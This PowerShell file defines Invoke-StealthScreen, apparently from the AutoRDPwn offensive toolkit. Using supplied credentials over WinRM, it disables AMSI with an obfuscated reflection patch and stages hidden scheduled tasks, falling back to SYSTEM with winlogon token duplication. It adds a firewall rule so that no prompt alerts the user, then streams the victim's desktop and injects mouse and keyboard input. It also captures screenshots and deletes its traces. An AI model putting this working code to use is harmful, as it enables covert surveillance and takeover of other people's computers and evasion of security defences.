function Invoke-StealthScreen {
    Param(
        [Parameter(Mandatory)] $Target,
        [Parameter(Mandatory)] $User,
        [Parameter(Mandatory)] $Pass,
        $Mode = 'view',
        $AttackerIP,
        $Port = 5500,
        $Password = 'AutoRDPw',
        $Path = 'C:\Windows\Temp',
        $HttpPort = 8081,
        $FrameQuality = 55,
        $FrameInterval = 200,
        [switch] $ViewOnly = $false,
        [switch] $VerboseLog = $false
    )

    $ErrorActionPreference = 'Stop'

    # Runtime artifacts stay inside the repository (excluded folder), never outside it.
    $tools = Join-Path (Split-Path $PSScriptRoot -Parent) 'Tools'
    if (!(Test-Path $tools)) { New-Item -ItemType Directory -Path $tools -Force | Out-Null }

    function New-B64([string]$text) { [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text)) }

    function New-FrameServerScript {
        # The target-side half of the viewer: capture the console desktop, encode
        # JPEG in memory and answer HTTP on one port. Single threaded on purpose -
        # a TcpListener needs no URL ACL, no HTTP.sys reservation and no extra
        # process, and it keeps every request inside the same request/response
        # shape the staging server already proves on this target.
        Param(
            [Parameter(Mandatory)] [int] $Port,
            [int] $Quality = 55,
            [int] $Interval = 200,
            [Parameter(Mandatory)] [string] $StopFile,
            [bool] $AllowInput = $false
        )

        $template = @'
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$port = __PORT__
$quality = __QUALITY__
$interval = __INTERVAL__
$stopFile = '__STOPFILE__'
$allowInput = __INPUT__

$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
$encoder = New-Object System.Drawing.Imaging.EncoderParameters 1
$encoder.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int64]$quality)

if ($allowInput) {
    $source = @"
using System;
using System.Runtime.InteropServices;
public static class ARFrameInput {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint flags, int dx, int dy, int data, UIntPtr extra);
    [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte scan, uint flags, UIntPtr extra);
}
"@
    try { Add-Type -TypeDefinition $source } catch { }
}

$utf8 = [System.Text.Encoding]::UTF8
$ascii = [System.Text.Encoding]::ASCII
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)
try { $listener.Start() } catch { exit 1 }

function Send-Reply {
    param($stream, [string]$status, [string]$type, [byte[]]$body)
    $head = 'HTTP/1.1 ' + $status + "`r`nContent-Type: " + $type + "`r`nContent-Length: " + $body.Length + "`r`nCache-Control: no-store`r`nConnection: close`r`n`r`n"
    $headBytes = $ascii.GetBytes($head)
    try {
        $stream.Write($headBytes, 0, $headBytes.Length)
        if ($body.Length -gt 0) { $stream.Write($body, 0, $body.Length) }
        $stream.Flush()
    } catch { }
}

function Invoke-InputEvent([string]$query) {
    $fields = @{}
    foreach ($pair in ($query -split '&')) {
        $kv = $pair -split '=', 2
        if ($kv.Count -eq 2) { $fields[$kv[0]] = [System.Uri]::UnescapeDataString($kv[1]) }
    }
    if ($fields.ContainsKey('x') -or $fields.ContainsKey('y')) {
        $x = 0; $y = 0
        if ($fields.ContainsKey('x')) { $x = [int]$fields['x'] }
        if ($fields.ContainsKey('y')) { $y = [int]$fields['y'] }
        $null = [ARFrameInput]::SetCursorPos($x, $y)
    }
    switch ($fields['t']) {
        'down' {
            $flag = 0x0002
            if ($fields['b'] -eq 'right') { $flag = 0x0008 }
            elseif ($fields['b'] -eq 'middle') { $flag = 0x0020 }
            [ARFrameInput]::mouse_event([uint32]$flag, 0, 0, 0, [UIntPtr]::Zero)
        }
        'up' {
            $flag = 0x0004
            if ($fields['b'] -eq 'right') { $flag = 0x0010 }
            elseif ($fields['b'] -eq 'middle') { $flag = 0x0040 }
            [ARFrameInput]::mouse_event([uint32]$flag, 0, 0, 0, [UIntPtr]::Zero)
        }
        'wheel' {
            [ARFrameInput]::mouse_event([uint32]0x0800, 0, 0, [int]$fields['d'], [UIntPtr]::Zero)
        }
        'keydown' {
            [ARFrameInput]::keybd_event([byte][int]$fields['vk'], 0, 0, [UIntPtr]::Zero)
        }
        'keyup' {
            [ARFrameInput]::keybd_event([byte][int]$fields['vk'], 0, 2, [UIntPtr]::Zero)
        }
    }
}

$jpeg = New-Object byte[] 0
$info = 'warming up'
$frames = 0
$lastCapture = [DateTime]::MinValue
$lastRequest = [DateTime]::MinValue

while (-not (Test-Path -LiteralPath $stopFile)) {
    $now = Get-Date
    # Capture only while somebody is pulling: an unwatched viewer costs nothing.
    $active = ($lastRequest -ne [DateTime]::MinValue) -and (($now - $lastRequest).TotalSeconds -lt 4)
    if ($active -and (($now - $lastCapture).TotalMilliseconds -ge $interval)) {
        try {
            $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bitmap.Size)
            $graphics.Dispose()
            $buffer = New-Object System.IO.MemoryStream
            $bitmap.Save($buffer, $codec, $encoder)
            $bitmap.Dispose()
            $jpeg = $buffer.ToArray()
            $buffer.Dispose()
            $frames++
            $lastCapture = $now
            $info = 'frame=' + $now.ToString('HH:mm:ss') + ' session=' + (Get-Process -Id $PID).SessionId + ' screen=' + $bounds.Width + 'x' + $bounds.Height + ' frames=' + $frames
        } catch { }
    }

    if ($listener.Pending()) {
        try {
            $client = $listener.AcceptTcpClient()
            $client.ReceiveTimeout = 2000
            $stream = $client.GetStream()
            $stream.ReadTimeout = 2000
            $requestBuffer = New-Object byte[] 1024
            $read = 0
            try { $read = $stream.Read($requestBuffer, 0, $requestBuffer.Length) } catch { }
            $requestLine = $utf8.GetString($requestBuffer, 0, [Math]::Max($read, 0))
            $path = ''
            $query = ''
            if ($requestLine -match '^\S+\s+(\S+)') {
                $path = $matches[1]
                if ($path -match '\?(.*)$') {
                    $query = $matches[1]
                    $path = $path.Substring(0, $path.IndexOf('?'))
                }
            }
            switch -Wildcard ($path) {
                '/latest.jpg' {
                    if ($jpeg.Length -gt 0) { Send-Reply $stream '200 OK' 'image/jpeg' $jpeg }
                    else { Send-Reply $stream '503 Service Unavailable' 'text/plain' ($ascii.GetBytes('warming up')) }
                }
                '/latest.txt' { Send-Reply $stream '200 OK' 'text/plain' ($utf8.GetBytes($info)) }
                '/input' {
                    if ($allowInput) { try { Invoke-InputEvent $query } catch { } }
                    Send-Reply $stream '200 OK' 'text/plain' ($ascii.GetBytes('ok'))
                }
                '/stop' {
                    Send-Reply $stream '200 OK' 'text/plain' ($ascii.GetBytes('bye'))
                    Set-Content -LiteralPath $stopFile -Value 'stop' -Force
                }
                default { Send-Reply $stream '404 Not Found' 'text/plain' ($ascii.GetBytes('not found')) }
            }
            $client.Close()
            $lastRequest = Get-Date
        } catch { }
    }

    Start-Sleep -Milliseconds 15
}

$listener.Stop()
Remove-Item -LiteralPath $stopFile -Force -ErrorAction SilentlyContinue
'@

        $text = $template.Replace('__PORT__', [string]$Port)
        $text = $text.Replace('__QUALITY__', [string]$Quality)
        $text = $text.Replace('__INTERVAL__', [string]$Interval)
        $text = $text.Replace('__STOPFILE__', $StopFile)
        if ($AllowInput) { $text = $text.Replace('__INPUT__', '$true') } else { $text = $text.Replace('__INPUT__', '$false') }
        return $text
    }

    function Show-ARFrameViewer {
        # Operator side: pull the latest frame, paint it, and (in control mode)
        # forward mouse and keyboard events to the target-side endpoint.
        Param(
            [Parameter(Mandatory)] [string] $BaseUrl,
            [string] $Title = 'Remote screen',
            [switch] $Interactive,
            [int] $Width = 1024,
            [int] $Height = 768
        )

        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Net.Http

        $client = New-Object System.Net.Http.HttpClient
        $client.Timeout = [TimeSpan]::FromSeconds(4)

        $form = New-Object System.Windows.Forms.Form
        $form.Text = $Title
        $form.StartPosition = 'CenterScreen'
        $form.BackColor = [System.Drawing.Color]::Black
        $form.ClientSize = New-Object System.Drawing.Size $Width, $Height
        $form.KeyPreview = $true

        $picture = New-Object System.Windows.Forms.PictureBox
        $picture.Dock = 'Fill'
        $picture.SizeMode = 'Zoom'
        $picture.BackColor = [System.Drawing.Color]::Black
        $form.Controls.Add($picture)

        $status = New-Object System.Windows.Forms.Label
        $status.Dock = 'Bottom'
        $status.Height = 22
        $status.ForeColor = [System.Drawing.Color]::FromArgb(190, 190, 190)
        $status.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 28)
        $status.Font = New-Object System.Drawing.Font 'Consolas', 9
        $status.Text = 'connecting...'
        $form.Controls.Add($status)

        $script:ARViewerFrames = 0
        $script:ARViewerMisses = 0
        $script:ARViewerInfo = ''
        $script:ARViewerWidth = 0
        $script:ARViewerHeight = 0
        $script:ARViewerLastMove = [DateTime]::MinValue

        $sendInput = {
            param([string]$query)
            if (-not $Interactive) { return }
            try { $null = $client.GetStringAsync($BaseUrl + '/input?' + $query).GetAwaiter().GetResult() } catch { }
        }

        # PictureBox is Zoom, so map a client point back through the letterbox.
        $toRemote = {
            param([int]$px, [int]$py)
            $imageWidth = $script:ARViewerWidth
            $imageHeight = $script:ARViewerHeight
            if ($imageWidth -le 0 -or $imageHeight -le 0) { return @{ x = 0; y = 0 } }
            $clientWidth = $picture.ClientSize.Width
            $clientHeight = $picture.ClientSize.Height
            if ($clientWidth -le 0 -or $clientHeight -le 0) { return @{ x = 0; y = 0 } }
            $scale = [Math]::Min($clientWidth / $imageWidth, $clientHeight / $imageHeight)
            if ($scale -le 0) { return @{ x = 0; y = 0 } }
            $offsetX = ($clientWidth - $imageWidth * $scale) / 2
            $offsetY = ($clientHeight - $imageHeight * $scale) / 2
            $x = [int](($px - $offsetX) / $scale)
            $y = [int](($py - $offsetY) / $scale)
            if ($x -lt 0) { $x = 0 }
            if ($y -lt 0) { $y = 0 }
            if ($x -ge $imageWidth) { $x = $imageWidth - 1 }
            if ($y -ge $imageHeight) { $y = $imageHeight - 1 }
            return @{ x = $x; y = $y }
        }

        $timer = New-Object System.Windows.Forms.Timer
        $timer.Interval = 120
        $timer.Add_Tick({
            try {
                $bytes = $client.GetByteArrayAsync($BaseUrl + '/latest.jpg').GetAwaiter().GetResult()
                if ($bytes -and $bytes.Length -gt 512) {
                    $stream = New-Object System.IO.MemoryStream(, $bytes)
                    $image = [System.Drawing.Image]::FromStream($stream)
                    $copy = New-Object System.Drawing.Bitmap $image
                    $script:ARViewerWidth = $image.Width
                    $script:ARViewerHeight = $image.Height
                    $image.Dispose()
                    $stream.Dispose()
                    $old = $picture.Image
                    $picture.Image = $copy
                    if ($old) { $old.Dispose() }
                    $script:ARViewerFrames++
                    $script:ARViewerMisses = 0
                    if (($script:ARViewerFrames % 8) -eq 1) {
                        try {
                            $text = $client.GetStringAsync($BaseUrl + '/latest.txt').GetAwaiter().GetResult()
                            $script:ARViewerInfo = ($text -split "`r?`n")[0]
                        } catch { }
                    }
                    $label = 'frames: ' + $script:ARViewerFrames + '  |  ' + $script:ARViewerInfo
                    if ($Interactive) { $label += '  |  control  |  ESC closes' } else { $label += '  |  view only  |  ESC closes' }
                    $status.Text = $label
                }
            } catch {
                $script:ARViewerMisses++
                if ($script:ARViewerMisses -eq 40) { $status.Text = 'no frames - the target stopped answering' }
            }
        })

        $form.Add_KeyDown({
            if ($_.KeyCode -eq 'Escape') { $form.Close(); return }
            if (-not $Interactive) { return }
            & $sendInput ('t=keydown&vk=' + [int]$_.KeyCode)
        })
        $form.Add_KeyUp({
            if (-not $Interactive) { return }
            & $sendInput ('t=keyup&vk=' + [int]$_.KeyCode)
        })
        $picture.Add_MouseMove({
            if (-not $Interactive) { return }
            if (((Get-Date) - $script:ARViewerLastMove).TotalMilliseconds -lt 40) { return }
            $script:ARViewerLastMove = Get-Date
            $point = & $toRemote $_.X $_.Y
            & $sendInput ('t=move&x=' + $point.x + '&y=' + $point.y)
        })
        $picture.Add_MouseDown({
            if (-not $Interactive) { return }
            $button = 'left'
            if ($_.Button -eq [System.Windows.Forms.MouseButtons]::Right) { $button = 'right' }
            elseif ($_.Button -eq [System.Windows.Forms.MouseButtons]::Middle) { $button = 'middle' }
            $point = & $toRemote $_.X $_.Y
            & $sendInput ('t=down&b=' + $button + '&x=' + $point.x + '&y=' + $point.y)
        })
        $picture.Add_MouseUp({
            if (-not $Interactive) { return }
            $button = 'left'
            if ($_.Button -eq [System.Windows.Forms.MouseButtons]::Right) { $button = 'right' }
            elseif ($_.Button -eq [System.Windows.Forms.MouseButtons]::Middle) { $button = 'middle' }
            & $sendInput ('t=up&b=' + $button)
        })
        $picture.Add_MouseWheel({
            if (-not $Interactive) { return }
            & $sendInput ('t=wheel&d=' + $_.Delta)
        })

        $form.Add_Shown({ $timer.Start() })
        [void]$form.ShowDialog()
        $timer.Stop()

        try { $null = $client.GetStringAsync($BaseUrl + '/stop').GetAwaiter().GetResult() } catch { }
        $client.Dispose()
        return $script:ARViewerFrames
    }

    $cs = @'
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("kernel32.dll")] public static extern UInt32 WTSGetActiveConsoleSessionId();
    [DllImport("wtsapi32.dll", SetLastError=true)] public static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool CreateProcessAsUserW(IntPtr hToken, IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@

    # The string "AmsiUtils"/"amsiInitFailed" is assembled from char codes so it
    # never appears in plaintext in the task argument.
    $amsi = @'
try {
  $a = -join [char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e)
  $t = $a + (-join [char[]](0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73))
  $f = -join [char[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)
  [Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue($null,$true)
} catch { }
'@

    function New-ParentPayload([string]$childB64) {
        $tpl = @"
`$ErrorActionPreference = 'SilentlyContinue'
$amsi
try { Add-Type -TypeDefinition @'
$cs
'@ } catch { }
`$sessId = [WTS]::WTSGetActiveConsoleSessionId()
`$tok = [IntPtr]::Zero
`$q = `$false
try { `$q = [WTS]::WTSQueryUserToken(`$sessId, [ref]`$tok) } catch { }
if (`$q) { `$dup = [IntPtr]::Zero; if ([WTS]::DuplicateTokenEx(`$tok, 0x18B, [IntPtr]::Zero, 2, 1, [ref]`$dup)) { `$tok = `$dup } }
if (!`$q) {
    `$wl = Get-Process winlogon | Where-Object { `$_.SessionId -eq `$sessId } | Select-Object -First 1
    if (`$wl) { `$h = [WTS]::OpenProcess(0x0400, `$false, `$wl.Id); if (`$h -ne [IntPtr]::Zero) { `$null = [WTS]::OpenProcessToken(`$h, 0x18B, [ref]`$tok) } }
}
`$si = New-Object WTS+STARTUPINFO
`$si.cb = [Runtime.InteropServices.Marshal]::SizeOf(`$si)
`$si.lpDesktop = 'WinSta0\Default'
`$cmd = 'powershell.exe -nop -w hidden -e $childB64'
`$pi = New-Object WTS+PROCESS_INFORMATION
`$ptrSi = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf(`$si))
[Runtime.InteropServices.Marshal]::StructureToPtr(`$si, `$ptrSi, `$false)
`$ptrPi = [Runtime.InteropServices.Marshal]::AllocHGlobal(24)
[Runtime.InteropServices.Marshal]::Copy((New-Object byte[] 24), 0, `$ptrPi, 24)
`$cp = [Runtime.InteropServices.Marshal]::StringToHGlobalUni(`$cmd)
`$null = [WTS]::CreateProcessAsUserW(`$tok, [IntPtr]::Zero, `$cp, [IntPtr]::Zero, [IntPtr]::Zero, `$false, 0x08000000, [IntPtr]::Zero, [IntPtr]::Zero, `$ptrSi, `$ptrPi)
"@
        return $tpl
    }

    function Start-RemotePayload {
        Param([string]$text, [string]$taskName)
        $remoteScript = 'C:\Windows\Temp\' + $taskName + '.ps1'
        # One payload body per path: the session-1 payload runs as-is when the
        # task is interactive, and is wrapped in the token-spawning parent when
        # the task has to fall back to SYSTEM.
        $wrapped = New-ParentPayload (New-B64 $text)
        $result = Invoke-Command -Session $s -ArgumentList $text, $wrapped, $remoteScript, $taskName, $User -ScriptBlock {
            Param($body, $wrappedBody, $path, $name, $userName)

            # An interactive task runs the payload inside the logged-on desktop
            # session. A SYSTEM task plus CreateProcessAsUserW produces a process
            # that never initialises, so that path is only the fallback.
            $userId = if ($userName -match '\\') { $userName } else { $env:COMPUTERNAME + '\' + $userName }
            $notes = New-Object System.Collections.Generic.List[string]
            $mode = ''
            try {
                Set-Content -LiteralPath $path -Value $body -Encoding UTF8 -Force -ErrorAction Stop
                $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -f "' + $path + '"')
                $principal = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
                Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskName $name -ErrorAction Stop
                $mode = 'interactive'
            }
            catch {
                $notes.Add('interactive: ' + $_.Exception.Message)
                Set-Content -LiteralPath $path -Value $wrappedBody -Encoding UTF8 -Force -ErrorAction Stop
                $cmdline = 'powershell.exe -nop -w hidden -ep bypass -f "' + $path + '"'
                $create = & schtasks.exe /create /tn $name /tr $cmdline /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f 2>&1
                $run = & schtasks.exe /run /tn $name 2>&1
                $notes.Add((($create | Out-String).Trim()))
                $notes.Add((($run | Out-String).Trim()))
                $mode = 'system'
            }

            [pscustomobject]@{
                Mode   = $mode
                Notes  = ($notes -join ' ')
                Script = $path
            }
        } -ErrorAction Stop
        if ($result) {
            if ($result.Mode -ne 'interactive') {
                Write-Host ('[!] interactive task failed, fell back to SYSTEM: ' + $result.Notes) -ForegroundColor Yellow
            }
        }
        return $result
    }

    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
    if (!$s) { Write-Host "[!] WinRM session failed" -ForegroundColor Red; return }

    if ($Mode -eq 'view') {
        # The frame server runs inside the console session and serves the latest
        # JPEG over HTTP on the target. The operator pulls frames, so the target
        # never has to dial back and nothing is mapped into another process.
        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
        $remoteScript = 'C:\Windows\Temp\' + $taskName + '.ps1'
        $stopFile = 'C:\Windows\Temp\' + $taskName + '.stop'
        $ruleName = 'AutoRDPwn Frame ' + $HttpPort
        $baseUrl = 'http://' + $Target + ':' + $HttpPort

        # Open the port before the listener binds. A blocked first connection
        # pops the Windows Defender Firewall prompt on the user's desktop, which
        # is exactly the noise this route exists to avoid.
        $null = Invoke-Command -Session $s -ArgumentList $ruleName, $HttpPort -ScriptBlock {
            Param($name, $port)
            & netsh.exe advfirewall firewall delete rule name="$name" 2>&1 | Out-Null
            & netsh.exe advfirewall firewall add rule name="$name" dir=in action=allow protocol=TCP localport=$port 2>&1 | Out-Null
        } -ErrorAction SilentlyContinue
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) {
            if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) }
        }

        # Everything from here is torn down in the finally, so an error, a kill
        # or a closed console still leaves the target without a task, a rule or
        # a listening port.
        try {
            Write-Host ("[+] Staging the frame server on {0} (TCP {1})" -f $Target, $HttpPort) -ForegroundColor Blue
            $frameServer = New-FrameServerScript -Port $HttpPort -Quality $FrameQuality -Interval $FrameInterval -StopFile $stopFile -AllowInput (-not $ViewOnly)
            $started = Start-RemotePayload -text $frameServer -taskName $taskName
            if (-not $started) {
                Write-Host "[!] The payload was not staged on $Target" -ForegroundColor Red
                return
            }

            # Cold start: the task has to launch PowerShell, load WinForms and bind.
            $probe = New-Object Net.WebClient
            $ready = $false
            for ($attempt = 1; $attempt -le 15; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $bytes = $probe.DownloadData($baseUrl + '/latest.txt')
                    if ($bytes -and $bytes.Length -gt 0) { $ready = $true; break }
                } catch { }
                Write-Host ("[i] waiting for the frame server ({0}s)" -f ($attempt * 3)) -ForegroundColor DarkGray
            }
            $probe.Dispose()

            if ($ready) {
                Write-Host "[+] Frame server answering - opening the viewer (ESC closes)" -ForegroundColor Green
                $viewMode = 'view only'
                if (-not $ViewOnly) { $viewMode = 'control' }
                $null = Show-ARFrameViewer -BaseUrl $baseUrl -Title ($Target + ' - ' + $viewMode) -Interactive:(-not $ViewOnly)
            }
            else {
                Write-Host "[!] The frame server never answered on $baseUrl" -ForegroundColor Red
            }
        }
        finally {
            # Stop the loop, drop the task, the script, the stop file, the rule,
            # and anything still holding the script open.
            $null = Invoke-Command -Session $s -ArgumentList $taskName, $remoteScript, $stopFile, $ruleName, $HttpPort -ScriptBlock {
                Param($name, $remotePath, $stop, $rule, $port)
                try { (New-Object Net.WebClient).DownloadString('http://127.0.0.1:' + $port + '/stop') | Out-Null } catch { }
                Start-Sleep -Milliseconds 400
                & schtasks.exe /delete /tn $name /f 2>&1 | Out-Null
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                    Where-Object { $_.CommandLine -and $_.CommandLine.Contains($remotePath) } |
                    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                & netsh.exe advfirewall firewall delete rule name="$rule" 2>&1 | Out-Null
                Remove-Item -LiteralPath $remotePath, $stop -Force -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue
            if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) {
                if ($script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Remove($ruleName) | Out-Null }
            }
        }
    }

    if ($Mode -eq 'shot') {
        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue

        $shotName = 'ss{0}.png' -f (Get-Random -Maximum 99999)
        $shotFile = Join-Path $Path $shotName
        $shotCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; New-Item -ItemType Directory -Path '$Path' -Force | Out-Null; `$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; `$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; `$g = [System.Drawing.Graphics]::FromImage(`$bmp); `$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); `$bmp.Save('$shotFile'); `$g.Dispose(); `$bmp.Dispose()"

        $shotChild = "`$ErrorActionPreference = 'SilentlyContinue'`r`n$amsi`r`n$shotCmd`r`n"
        $taskName = 'W' + (-join (1..8 | ForEach-Object { '{0:X}' -f (Get-Random -Maximum 16) }))
        $staged = Start-RemotePayload -text $shotChild -taskName $taskName
        if (-not $staged) { Write-Host "[!] The capture payload was not staged on $Target" -ForegroundColor Red; Remove-PSSession $s; return }

        $res = $null
        for ($i = 0; $i -lt 6; $i++) {
            Start-Sleep -Seconds 4
            $res = invoke-command -session $s -scriptblock {
                Param($f)
                if (Test-Path $f) { [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) }
            } -ArgumentList $shotFile
            if ($res) { break }
        }

        invoke-command -session $s -scriptblock {
            Param($name, $f)
            & schtasks.exe /delete /tn $name /f 2>&1 | Out-Null
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $f, ('C:\Windows\Temp\' + $name + '.ps1') -Force -ErrorAction SilentlyContinue
        } -ArgumentList $taskName, $shotFile

        if ($res) {
            $out = Join-Path $tools 'stealthshot.png'
            [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($res))
            Write-Host "[+] Screen captured: $out" -ForegroundColor Green
            Invoke-Item $out
        } else {
            Write-Host "[!] No screenshot arrived" -ForegroundColor Red
        }
    }

    Remove-PSSession $s
}
